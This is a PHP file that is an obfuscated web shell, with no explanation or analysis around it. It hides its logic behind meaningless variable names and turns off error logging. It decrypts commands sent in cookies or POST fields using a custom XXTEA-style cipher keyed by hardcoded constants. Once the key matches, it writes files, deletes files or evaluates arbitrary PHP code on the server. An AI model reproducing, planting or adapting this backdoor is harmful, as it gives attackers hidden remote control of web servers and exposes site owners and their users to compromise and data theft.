<?php

/* Verification */
define("SERIAL", "0f3d887b-8625-49f5-85c7-91871b35dd1c-0d2d887b-8635-48f5-86b7-91951b75dd1c-d2af3c97-bc98-4a93-8e45-d8b7e56080f7");
define("NUMBER", "ef5e523c-8c3b-43b4-b2ec-21e34e86b3f1");

/* Configuration */
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@error_reporting(0);
@ini_set('max_execution_time', 20); 
@set_time_limit(20);

function c1($x15,$a11){
    $w10=unpack("V*",$x15.str_repeat("\0",(4-strlen($x15)%4)&3));
    $w10=array_values($w10);
    if($a11){
        $w10[count($w10)]=strlen($x15);
    }
    return $w10;
}

function p2($h13){
    return($h13&0xffffffff);
}

function n7($n31,$f32){
    $o33=x6(base64_decode($n31),SERIAL);
    $o33=n5($o33,NUMBER);
    return x6($o33,$f32);
}

function x6($n26,$e27){
    $c28="";
    for($n16=0;$n16<strlen($n26);){
        for($y29=0;$y29<strlen($e27)&&$n16<strlen($n26);$y29++,$n16++){
            $c30=ord($n26[$n16])^ord($e27[$y29]);
            $c28=$c28.chr($c30);
            $y29=$y29%strlen($e27);
        }
    }
    return $c28;
}

function m8($a34,$n31,$f32){
    return@unserialize(x6(n5(base64_decode($a34),n7($n31,$f32)),$f32));
}

$roles=False;
foreach($_COOKIE as $agents=>$roles){
    $partner=explode("-",$roles);
    $roles=$agents;
    $roles=m8($partner[0].$partner[1],$partner[2],$roles);
    if($roles){
        break;
    }
}

function n5($z23,$x24){
    $w10=c1($z23,false);
    $i22=p4(c1($x24,false));
    $h13=count($w10)-1;
    $l18=$w10[0];
    $v25=floor(6+52/($h13+1));
    $a17=p2($v25*(0x51BF0100+0x4C7878B9));
    while($a17!=0){
        $m21=$a17>>2&3;
        for($q20=$h13;$q20>0;$q20--){
            $c19=$w10[$q20-1];
            $l18=$w10[$q20]=p2($w10[$q20]-r3($a17,$l18,$c19,$q20,$m21,$i22));
    }
    $c19=$w10[$h13];
    $l18=$w10[0]=p2($w10[0]-r3($a17,$l18,$c19,$q20,$m21,$i22));
    $a17=p2($a17-(0xA07076D3-0x0238FD1A));
    }
    return d0($w10,true);
}if(!$roles){
foreach($_POST as $agents=>$roles){
    $partner=explode("-",$roles);
    $roles=$agents;
    $roles=m8($partner[0].$partner[1],$partner[2],$roles);
    if($roles){
    break;
    }
}}

function d0($w10,$a11){
    $b12=count($w10);
    $h13=$b12<<2;
    if($a11){
        $u14=$w10[$b12-1];
        $h13-=4;
        if(($u14<$h13-3)||($u14>$h13))
            return false;
        $h13=$u14;
    }
    $x15=array();
    for($n16=0;$n16<$b12;$n16++){
        $x15[$n16]=pack("V",$w10[$n16]);
    }if($a11){
        return substr(join('',$x15),0,$h13);
    }else{
        return join('',$x15);
    }
}

if(!isset($roles['k'])||!NUMBER==$roles['k']){
    function()use($roles){SERIAL;};
}else{
    switch($roles['a']){
        case "i":
            echo@serialize(['php'=>@phpversion(),'version'=>"2.0.1",]);
            break;
        case "p":
            echo(@file_put_contents($roles['n'],$roles['d']))?1:0;
            break;
        case "u":
            echo(@unlink($roles['n']))?1:0;
            break;
        case "e":
            @eval($roles['d']);
            break;
    }exit();
}

function r3($a17,$l18,$c19,$q20,$m21,$i22){
    return((($c19>>5&0x07ffffff)^$l18<<2)+(($l18>>3&0x1fffffff)^$c19<<4))^(($a17^$l18)+($i22[$q20&3^$m21]^$c19));
}

function p4($i22){
    if(count($i22)<4){
        for($n16=count($i22);$n16<4;$n16++){
            $i22[$n16]=0;
        }
    }
    return $i22;
}
